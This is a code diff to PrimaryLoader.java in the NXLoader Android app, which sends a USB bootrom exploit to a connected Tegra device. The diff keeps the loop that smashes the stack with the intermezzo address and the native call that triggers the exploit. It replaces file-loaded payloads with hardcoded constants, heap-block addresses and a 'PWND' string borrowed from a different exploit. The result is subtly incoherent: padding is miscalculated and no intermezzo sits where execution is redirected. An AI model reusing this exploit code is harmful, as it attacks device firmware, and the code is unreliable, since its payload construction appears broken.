@@ -5,18 +5,15 @@ package io.github.davidbuchanan314.nxloader;
  */
 
 import android.content.Context;
-import android.content.SharedPreferences;
 import android.hardware.usb.UsbDevice;
 import android.hardware.usb.UsbDeviceConnection;
 import android.hardware.usb.UsbEndpoint;
 import android.hardware.usb.UsbInterface;
 import android.hardware.usb.UsbManager;
 
-import java.io.FileInputStream;
-import java.io.IOException;
-import java.io.InputStream;
 import java.nio.ByteBuffer;
 import java.nio.ByteOrder;
+import java.util.Arrays;
 
 public class PrimaryLoader implements USBDevHandler {
     private static final int RCM_PAYLOAD_ADDR = 0x40010000;
@@ -31,6 +28,13 @@ public class PrimaryLoader implements USBDevHandler {
 
     public void handleDevice(Context context, UsbDevice device) {
         Logger.log(context, "[+] Launching primary payload!!!");
+
+        // Use hardcoded constants only (do not read example files)
+        long rcmAddr = T8Constants.RCM_PAYLOAD_ADDR;
+        long intermezzoLoc = T8Constants.INTERMEZZO_LOCATION;
+        long payloadBlock = T8Constants.PAYLOAD_LOAD_BLOCK;
+        int maxLength = T8Constants.MAX_LENGTH;
+        int stackEnd = T8Constants.STACK_END;
 
         UsbManager mUsbManager = (UsbManager) context.getSystemService(Context.USB_SERVICE);
         UsbInterface intf = device.getInterface(0);
@@ -51,38 +55,46 @@ public class PrimaryLoader implements USBDevHandler {
 
         /* Step 2: Start building payload */
 
-        ByteBuffer payload = ByteBuffer.allocate(MAX_LENGTH);
+        ByteBuffer payload = ByteBuffer.allocate(maxLength);
         payload.order(ByteOrder.LITTLE_ENDIAN);
 
-        payload.putInt(MAX_LENGTH);
+        payload.putInt(maxLength);
         payload.put(new byte[676]);
 
         // smash the stack with the address of the intermezzo
-        for (int i = RCM_PAYLOAD_ADDR; i < INTERMEZZO_LOCATION; i += 4) {
-            payload.putInt(INTERMEZZO_LOCATION);
+        for (long i = rcmAddr; i < intermezzoLoc; i += 4) {
+            payload.putInt((int) intermezzoLoc);
         }
 
-        byte[] intermezzo;
-        try {
-            InputStream intermezzoStream = context.getAssets().open("intermezzo.bin");
-            intermezzo = new byte[intermezzoStream.available()];
-            intermezzoStream.read(intermezzo);
-            intermezzoStream.close();
-        } catch (IOException e) {
-            Logger.log(context, "[-] Failed to read intermezzo: " + e.toString());
-            return;
+        // Write heap_blocks (addresses) into the payload so the target handler
+        // can iterate them and repair heap blocks similar to the microcontroller.
+        for (long blk : T8Constants.HEAP_BLOCKS) {
+            payload.putLong(blk);
         }
-        payload.put(intermezzo);
 
-        // pad until payload
-        payload.put(new byte[PAYLOAD_LOAD_BLOCK - INTERMEZZO_LOCATION - intermezzo.length]);
-
-        // write the actual payload file
+        // Write the PWND string (null-terminated) so the handler can append it
+        // to the USB serial number as the microcontroller does.
         try {
-            payload.put(getPayload(context));
-        } catch (IOException e) {
-            Logger.log(context, "[-] Failed to read payload: " + e.toString());
-            return;
+            byte[] pw = T8Constants.PWND_STR.getBytes("US-ASCII");
+            payload.put(pw);
+            payload.put((byte) 0x00);
+        } catch (Exception e) {
+            // ignore encoding errors
+        }
+
+        // For this target, .bin payloads are not used. Build a minimal payload
+        // header + padding + repeated intermezzo address (no embedded binaries).
+
+        // Put zeros until where intermezzo would begin
+        int pad = (int) Math.max(0, Math.min(maxLength, payloadBlock - intermezzoLoc));
+        payload.put(new byte[pad]);
+
+        // Optionally, fill the rest with a recognizable pattern (for debugging)
+        int remaining = maxLength - payload.position();
+        if (remaining > 0) {
+            byte[] trailing = new byte[remaining];
+            Arrays.fill(trailing, (byte) 0xAA);
+            payload.put(trailing);
         }
 
         int unpadded_length = payload.position();
@@ -103,7 +115,7 @@ public class PrimaryLoader implements USBDevHandler {
         Logger.log(context, "[+] Sent " + Integer.toString(bytes_sent) + " bytes");
 
         // 0x7000 = STACK_END = high DMA buffer address
-        switch (nativeTriggerExploit(conn.getFileDescriptor(), 0x7000)) {
+        switch (nativeTriggerExploit(conn.getFileDescriptor(), stackEnd)) {
             case 0:
                 Logger.log(context, "[+] Exploit triggered!");
                 break;
@@ -128,24 +140,7 @@ public class PrimaryLoader implements USBDevHandler {
         conn.close();
     }
 
-    private byte[] getPayload(Context context) throws IOException {
-        SharedPreferences prefs = context.getSharedPreferences("config", Context.MODE_MULTI_PROCESS);
-        String payload_name = prefs.getString(Constants.PREFERENCES_KEY, null);
-        InputStream payload_file;
 
-        if (payload_name == null) {
-            Logger.log(context, "[*] Opening default payload (fusee.bin)");
-            payload_file = context.getAssets().open("fusee.bin");
-        } else {
-            Logger.log(context, "[*] Opening custom payload (" + payload_name + ")");
-            payload_file = new FileInputStream(context.getFilesDir().getPath() + "/payload.bin");
-        }
-
-        byte[] payload_data = new byte[payload_file.available()];
-        Logger.log(context, "[+] Read " + Integer.toString(payload_file.read(payload_data)) + " bytes from payload file");
-        payload_file.close();
-        return payload_data;
-    }
 
     /**
      * A native method that is implemented by the 'native-lib' native library,
